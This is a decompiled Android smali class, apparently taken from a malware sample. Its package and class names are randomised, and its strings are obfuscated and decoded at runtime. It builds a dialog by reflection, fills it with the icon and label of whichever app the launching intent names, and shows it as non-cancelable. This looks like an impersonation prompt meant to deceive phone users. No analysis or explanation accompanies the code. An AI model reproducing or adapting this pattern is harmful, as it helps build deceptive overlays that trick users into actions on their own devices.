.class public Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK;
.super Landroid/app/Activity;


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK$a;
    }
.end annotation


# static fields
.field private static a:Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK;


# instance fields
.field private b:Landroid/app/AlertDialog;

.field private c:Landroid/app/AlertDialog$Builder;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const/4 v0, 0x0

    sput-object v0, Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK;->a:Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method public static a()V
    .locals 1

    sget-object v0, Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK;->a:Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK;

    if-eqz v0, :cond_0

    sget-object v0, Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK;->a:Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK;

    invoke-virtual {v0}, Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK;->finish()V

    const/4 v0, 0x0

    sput-object v0, Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK;->a:Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK;

    :cond_0
    return-void
.end method

.method static synthetic a(Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK;)V
    .locals 0

    invoke-direct {p0}, Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK;->b()V

    return-void
.end method

.method private b()V
    .locals 1

    iget-object v0, p0, Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK;->c:Landroid/app/AlertDialog$Builder;

    invoke-virtual {v0}, Landroid/app/AlertDialog$Builder;->create()Landroid/app/AlertDialog;

    move-result-object v0

    iput-object v0, p0, Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK;->b:Landroid/app/AlertDialog;

    iget-object v0, p0, Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK;->b:Landroid/app/AlertDialog;

    invoke-virtual {v0}, Landroid/app/AlertDialog;->show()V

    return-void
.end method

.method private c()V
    .locals 1

    :try_start_0
    iget-object v0, p0, Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK;->b:Landroid/app/AlertDialog;

    if-eqz v0, :cond_0

    iget-object v0, p0, Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK;->b:Landroid/app/AlertDialog;

    invoke-virtual {v0}, Landroid/app/AlertDialog;->isShowing()Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK;->b:Landroid/app/AlertDialog;

    invoke-virtual {v0}, Landroid/app/AlertDialog;->dismiss()V

    const/4 v0, 0x0

    iput-object v0, p0, Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK;->b:Landroid/app/AlertDialog;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    :goto_0
    return-void

    :catch_0
    move-exception v0

    goto :goto_0
.end method


# virtual methods
.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 1

    const/16 v0, 0x6f

    if-ne p1, v0, :cond_0

    invoke-direct {p0}, Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK;->c()V

    :cond_0
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 6

    :try_start_0
    invoke-direct {p0}, Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK;->c()V

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    sput-object p0, Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK;->a:Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK;

    invoke-virtual {p0}, Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK;->getIntent()Landroid/content/Intent;

    move-result-object v0

    const-string v1, "lJuuQmbuVKfhDyuOMtVegJsW"

    invoke-static {v1}, Lru/jdhndtpk/iypwqbmltdwdk/a;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p0}, Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    const-string v0, "dGWRLIBtSZRniS"

    invoke-static {v0}, Lru/jdhndtpk/iypwqbmltdwdk/a;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Class;

    const/4 v4, 0x0

    const-class v5, Landroid/content/Context;

    aput-object v5, v3, v4

    invoke-virtual {v0, v3}, Ljava/lang/Class;->getConstructor([Ljava/lang/Class;)Ljava/lang/reflect/Constructor;

    move-result-object v0

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Object;

    const/4 v4, 0x0

    aput-object p0, v3, v4

    invoke-virtual {v0, v3}, Ljava/lang/reflect/Constructor;->newInstance([Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlertDialog$Builder;

    iput-object v0, p0, Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK;->c:Landroid/app/AlertDialog$Builder;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_1

    :try_start_1
    iget-object v0, p0, Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK;->c:Landroid/app/AlertDialog$Builder;

    invoke-virtual {v2, v1}, Landroid/content/pm/PackageManager;->getApplicationIcon(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v3

    invoke-virtual {v0, v3}, Landroid/app/AlertDialog$Builder;->setIcon(Landroid/graphics/drawable/Drawable;)Landroid/app/AlertDialog$Builder;
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_2

    :goto_0
    const/4 v0, 0x0

    :try_start_2
    invoke-virtual {v2, v1, v0}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v0

    invoke-virtual {v2, v0}, Landroid/content/pm/PackageManager;->getApplicationLabel(Landroid/content/pm/ApplicationInfo;)Ljava/lang/CharSequence;

    move-result-object v0

    check-cast v0, Ljava/lang/String;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0
    .catch Ljava/lang/Throwable; {:try_start_2 .. :try_end_2} :catch_1

    :goto_1
    :try_start_3
    iget-object v1, p0, Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK;->c:Landroid/app/AlertDialog$Builder;

    const-string v2, "cIHDbuUYdA"

    invoke-static {v2}, Lru/jdhndtpk/iypwqbmltdwdk/a;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Object;

    const/4 v4, 0x0

    aput-object v0, v3, v4

    invoke-static {v2, v3}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    const-string v1, "lTFuGWjYLzBMobZGiYknaIsvxfk"

    invoke-static {v1}, Lru/jdhndtpk/iypwqbmltdwdk/a;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setCancelable(Z)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    const-string v1, "eTFKyrzIYVqbvVfHgbkEFddeI"

    invoke-static {v1}, Lru/jdhndtpk/iypwqbmltdwdk/a;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    new-instance v2, Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK$a;

    invoke-direct {v2, p0, p0}, Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK$a;-><init>(Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK;Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK;)V

    invoke-virtual {v0, v1, v2}, Landroid/app/AlertDialog$Builder;->setNegativeButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    invoke-direct {p0}, Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK;->b()V
    :try_end_3
    .catch Ljava/lang/Throwable; {:try_start_3 .. :try_end_3} :catch_1

    :goto_2
    return-void

    :catch_0
    move-exception v0

    move-object v0, v1

    goto :goto_1

    :catch_1
    move-exception v0

    goto :goto_2

    :catch_2
    move-exception v0

    goto :goto_0
.end method

.method protected onDestroy()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    return-void
.end method

.method protected onPause()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onPause()V

    invoke-direct {p0}, Lru/jdhndtpk/iypwqbmltdwdk/jag/RJejvmK;->c()V

    return-void
.end method
